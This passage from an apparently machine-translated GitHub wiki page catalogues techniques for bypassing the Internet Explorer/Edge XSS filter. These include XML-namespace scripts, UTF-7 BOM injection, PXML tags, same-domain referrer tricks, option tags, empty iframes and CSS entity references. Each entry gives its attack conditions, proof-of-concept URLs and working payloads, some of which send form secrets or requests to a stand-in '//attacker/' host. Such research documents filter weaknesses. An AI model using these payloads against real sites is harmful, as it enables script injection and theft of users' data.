[https://vulnerabledoma.in/bypass/text?q=%3C?xml%20version=%221.0%22?%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%281%26%23x29%3B%3C/x:script%3E](https://vulnerabledoma.in/bypass/text?q=alert(1%26%23x29%3B)

```
<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1&#x29;</x:script>
```

### Use UTF-7 BOM (IE only)

Conditions for attacking:

1. Character strings can be written from the top of the page
2. `+`Symbols such as , `/`, are allowed`-`

supplement:

`+/v8`, `+/v9`, `+/v+`, are treated as `+/v/`UTF-7 [BOM . ](https://ja.wikipedia.org/wiki/バイトオーダーマーク)In IE, if this string appears at the top of the page, the character code of the page is assumed to be UTF-7. Even if the character code is specified in the page, if you `history.back()`open it again via , the character code of that page will be treated as UTF-7. (Although the latter behavior was reported to Microsoft in July 2013, no changes have been made to date.)

PoC:

(If there is no character code specified on the page) https://vulnerabledoma.in/bypass/text?q=%2B/v8-%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-

```
+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

(If the page has character code specification) https://l0.cm/bypass/ie_utf7.html

```
<script>
function go(){
  window.open("https://vulnerabledoma.in/bypass/text?q=%2B/v8-%2BADw-script%2BAD4-alert(location)%2BADw-/script%2BAD4-&charset=utf-8","a");
  setTimeout(function(){window.open("https://l0.cm/h_back.html","a")},1000);
}
</script>
<button onclick=go()>go</button>
```

### `<?PXML>`use (IE only)

Conditions for attacking:

1. Has reflective XSS
2. `<`3 or more do not appear before the injection point
3. The document mode of the page is set to 9 or less, or you can set the document mode to 9 or less by embedding in a frame, etc.

Reference URL:

- https://masatokinugawa.l0.cm/2017/05/xss13.html

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3C?PXML%3E%3Chtml:script%3Ealert(1)%3C/html:script%3E&xuac=9](https://vulnerabledoma.in/bypass/text?q=alert(1)&xuac=9)

```
<?PXML><html:script>alert(1)</html:script>
```

[https://vulnerabledoma.in/bypass/text?q=%3CPXML%3E%3Chtml:script%3Ealert(1)%3C/html:script%3E&xuac=9](https://vulnerabledoma.in/bypass/text?q=alert(1)&xuac=9)

```
<PXML><html:script>alert(1)</html:script>
```

### Use of referrer

IE/Edge's XSS filter does not work in cases with a Referer header from the same domain (including subdomains) or localhost. Bypassing is possible if such a referrer can be attached.

#### Use of link functions within the same domain (including subdomains)

Conditions for attacking:

1. Has reflective XSS
2. Create links to XSS pages on the same domain (including subdomains)

PoC:

- https://vulnerabledoma.in/bypass/same-domain-link.html
- https://www.vulnerabledoma.in/bypass/same-domain-link.html

```
<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>
```

#### Bypass where arbitrary URL can be specified

Conditions for attacking:

1. There are places where reflective XSS is possible in the link

supplement:

By double linking the vulnerable part and adding a referrer, you `javascript:`can create a link to the URL without reacting the XSS filter.

PoC:

[https://vulnerabledoma.in/bypass/link?q=?q=javascript%253Aalert(1)](https://vulnerabledoma.in/bypass/link?q=?q=javascript%3Aalert(1))

```
<a href="?q=javascript%3Aalert(1)">Link</a>
```

#### If the state before submission to the vulnerable form can be maintained on the page

Conditions for attacking:

1. Has reflective XSS
2. The state before submission to the vulnerable form can be maintained on the page of the same domain (including subdomains)

PoC:

[https://vulnerabledoma.in/bypass/form?q=%26%23x22%3B%3E%26%23x3C%3Bscript%3Ealert%26%23x28%3B1)%26%23x3C%3B/script%3E](https://vulnerabledoma.in/bypass/form?q=%26%23x22%3B>%26%23x3C%3Bscript>alert%26%23x28%3B1)%26%23x3C%3B/script>)

```
<form action="form">
<input type="hidden" name="q" value="&#x22;>&#x3C;script>alert&#x28;1)&#x3C;/script>">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

#### Using option tags

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. That XSS is within an existing form

Reference URL:

- https://html5sec.org/xssfilter/entities

PoC:

[https://vulnerabledoma.in/bypass/form3?q=%3Cbutton%20formaction=form3%3ECLICK%3Cselect%20name=q%3E%3Coption%3E%26lt%3Bscript%3Ealert(1)%26lt%3B/script%3E](https://vulnerabledoma.in/bypass/form3?q=CLICK%26lt%3Bscript>alert(1)%26lt%3B/script>)

```
<form action=submit>
<button formaction=form3>CLICK<select name=q><option>&lt;script>alert(1)&lt;/script>
</form>
```

#### Using an empty iframe

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. The page allows embedding in frames

supplement:

Creating an empty iframe with XSS and navigating a scripted URL to that frame causes a bypass due to the referrer of the vulnerable domain itself.

Reference URL:

- http://www.cracking.com.ar/bugs/2016-07-14/

PoC:

https://l0.cm/bypass/ieedge_iframe.html

```
<!-- Found by @magicmac2000 -->
<iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>
```

### Using formaction (getting information only)

Conditions for attacking:

1. Has reflective XSS
2. You can write a new formaction attribute where you can submit an existing form content that contains sensitive information.

PoC:

[https://vulnerabledoma.in/bypass/form?q=%22%3E%3Cbutton%20formaction=//attacker/%3E](https://vulnerabledoma.in/bypass/form?q=">)

```
<form action="form">
<input type="hidden" name="q" value=""><button formaction=//attacker/>">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

### Use of character-referenced strings in style (style description only)

Conditions for attacking:

1. Has reflective XSS
2. Attackable with CSS

supplement:

`@`Entity reference notations such as , `:`, `\`, that are part of the reaction string `(`are not taken into account, so bypassing occurs in style blocks and attribute values within SVG where entity reference notations are allowed. `behavior:url()`IE allows script execution via CSS as well as attacks that read information in some cases .

Reference URL:

- https://twitter.com/0x6D6172696F/status/752190911879184384
- http://www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt
- https://blog.innerht.ml/cascading-style-scripting/

PoC:

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%3E%3Cstyle%3E%26commat%3Bimport'//attacker'%3C/style%3E](https://vulnerabledoma.in/bypass/text?q=%26commat%3Bimport'//attacker')

```
<svg><style>&commat;import'//attacker'</style>
```

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%3E%3Cstyle%3E@%26bsol%3B0069mport%27//attacker%27%3C/style%3E](https://vulnerabledoma.in/bypass/text?q=@%26bsol%3B0069mport'//attacker')

```
<svg><style>@&bsol;0069mport'//attacker'</style>
```

(IE+IE10 mode only) [https://vulnerabledoma.in/bypass/text?q=%3Cp%20style="behavior%26colon%3Burl('/bypass/usercontent/xss.txt')"%3Etest&xuac=10](https://vulnerabledoma.in/bypass/text?q=test&xuac=10)

```
<p style="behavior&colon;url('/bypass/usercontent/xss.txt')">
```

(IE+IE10 mode only) [https://vulnerabledoma.in/bypass/text?q=%3Cp%20style="behavior:url%26lpar%3B'/bypass/usercontent/xss.txt')"%3Etest&xuac=10](https://vulnerabledoma.in/bypass/text?q=test&xuac=10)

```
<p style="behavior:url&lpar;'/bypass/usercontent/xss.txt')">
```

## past bypass

Posted [in Fixed Bypass Archive .](https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive#ieedgeのxssフィルター)

## Footer

© 2022 GitHub, Inc.

Footer navigation[Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)[Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)[Security](https://github.com/security)[Status](https://www.githubstatus.com/)[Docs](https://docs.github.com/)[Contact GitHub](https://support.github.com/?tags=dotcom-footer)[Pricing](https://github.com/pricing)[API](https://docs.github.com/)[Training](https://services.github.com/)[Blog](https://github.blog/)[About](https://github.com/about)